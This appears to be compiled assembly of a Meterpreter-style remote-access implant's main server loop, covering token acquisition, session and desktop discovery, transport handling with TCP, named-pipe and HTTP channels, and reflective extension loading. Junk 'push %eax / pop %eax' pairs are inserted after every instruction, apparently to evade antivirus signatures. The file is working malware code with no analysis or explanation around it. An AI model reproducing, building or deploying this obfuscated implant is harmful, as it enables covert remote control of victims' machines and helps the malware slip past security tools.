push %eax
pop %eax
	movl	-548(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_load_stageless_extensions
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_malloc
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 16(%eax)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__memcpy_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	leal	28(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	$1, 8(%esp)
push %eax
pop %eax
	movl	$983551, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__OpenThreadToken@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L53
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	leal	28(%eax), %ebx
push %eax
pop %eax
	movl	__imp__GetCurrentProcess@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%ebx, 8(%esp)
push %eax
pop %eax
	movl	$983551, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__OpenProcessToken@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
L53:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_scheduler_initialize
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L54
push %eax
pop %eax
	movl	$10, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L69
push %eax
pop %eax
L54:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 32(%eax)
push %eax
pop %eax
	call	_server_sessionid
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 36(%edx)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 40(%eax)
push %eax
pop %eax
	movl	__imp__GetProcessWindowStation@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$256, 12(%esp)
push %eax
pop %eax
	leal	-288(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	$2, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetUserObjectInformationA@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	leal	-288(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___strdup, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 44(%edx)
push %eax
pop %eax
	leal	-288(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___strdup, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 48(%edx)
push %eax
pop %eax
	movl	__imp__GetCurrentThreadId@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetThreadDesktop@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$256, 12(%esp)
push %eax
pop %eax
	leal	-544(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	$2, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetUserObjectInformationA@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	leal	-544(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___strdup, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 52(%edx)
push %eax
pop %eax
	leal	-544(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___strdup, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 56(%edx)
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 76(%edx)
push %eax
pop %eax
	jmp	L55
push %eax
pop %eax
L66:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L56
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	4(%edx), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L56
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	68(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 4(%eax)
push %eax
pop %eax
	jmp	L55
push %eax
pop %eax
L56:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	32(%eax), %eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L57
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	4(%edx), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
L57:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L58
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	jne	L59
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	8(%edx), %edx
push %eax
pop %eax
	testl	%edx, %edx
push %eax
pop %eax
	jne	L59
push %eax
pop %eax
	movl	$1, %ecx
push %eax
pop %eax
	jmp	L60
push %eax
pop %eax
L59:
	movl	$0, %ecx
push %eax
pop %eax
L60:
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	4(%edx), %edx
push %eax
pop %eax
	movl	%ecx, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
L58:
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	jne	L61
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L71
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 4(%eax)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	$0, 8(%eax)
push %eax
pop %eax
	jmp	L64
push %eax
pop %eax
L61:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	68(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 4(%eax)
push %eax
pop %eax
L64:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L65
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_sleep
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	$0, 12(%eax)
push %eax
pop %eax
L65:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free_encryption_context
push %eax
pop %eax
L55:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L66
push %eax
pop %eax
	jmp	L67
push %eax
pop %eax
L71:
	nop
push %eax
pop %eax
	jmp	L67
push %eax
pop %eax
L68:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_remove_transport
push %eax
pop %eax
L67:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L68
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_deregister_dispatch_routines
push %eax
pop %eax
L69:
	call	_scheduler_destroy
push %eax
pop %eax
	call	_command_join_threads
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_remote_deallocate
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	leal	-8(%ebp), %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%edi
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
.lcomm _processIdToSessionId.83551,4,4
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_LoadLibraryR@12;	.scl	2;	.type	32;	.endef
	.def	_load_extension;	.scl	2;	.type	32;	.endef
	.def	_stagelessinit_extension;	.scl	2;	.type	32;	.endef
	.def	_wcsncmp;	.scl	2;	.type	32;	.endef
	.def	_transport_create_tcp;	.scl	2;	.type	32;	.endef
	.def	_transport_create_named_pipe;	.scl	2;	.type	32;	.endef
	.def	_transport_create_http;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
	.def	_memcpy;	.scl	2;	.type	32;	.endef
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
	.def	_realloc;	.scl	2;	.type	32;	.endef
	.def	_transport_write_tcp_config;	.scl	2;	.type	32;	.endef
	.def	_transport_write_named_pipe_config;	.scl	2;	.type	32;	.endef
	.def	_transport_write_http_config;	.scl	2;	.type	32;	.endef
	.def	_disable_thread_error_reporting;	.scl	2;	.type	32;	.endef
	.def	_srand;	.scl	2;	.type	32;	.endef
	.def	_thread_open;	.scl	2;	.type	32;	.endef
	.def	_remote_allocate;	.scl	2;	.type	32;	.endef
	.def	_register_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_scheduler_initialize;	.scl	2;	.type	32;	.endef
	.def	_sleep;	.scl	2;	.type	32;	.endef
	.def	_free_encryption_context;	.scl	2;	.type	32;	.endef
	.def	_deregister_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_scheduler_destroy;	.scl	2;	.type	32;	.endef
	.def	_command_join_threads;	.scl	2;	.type	32;	.endef
	.def	_remote_deallocate;	.scl	2;	.type	32;	.endef
